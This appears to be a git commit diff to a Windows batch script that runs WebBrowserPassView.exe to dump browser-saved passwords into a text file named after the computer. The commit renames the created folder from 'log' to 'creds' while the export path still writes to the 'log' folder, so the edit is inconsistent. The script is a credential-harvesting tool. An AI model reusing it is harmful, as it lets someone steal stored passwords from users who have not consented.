48384bbe2798c5e95a4c9a3d87c400887e3b0b7e
oplogix <tyus.ashworth@gmail.com>
2023-03-12 14:08:33 -0400

    Update script.bat

--- script.bat
+++ script.bat
@@ -1,7 +1,7 @@
 @echo off
 
 :: Creates a folder called log only if the folder does not already exist.
-mkdir log
+mkdir creds
 
 :: The command below runs WebBrowserPassView.exe and exports the results as text documents using the naming conventione WebBrowserPassView.exe-ComputerName
 start WebBrowserPassView.exe /stext .\log\WebBrowserPassView-%computername%.txt
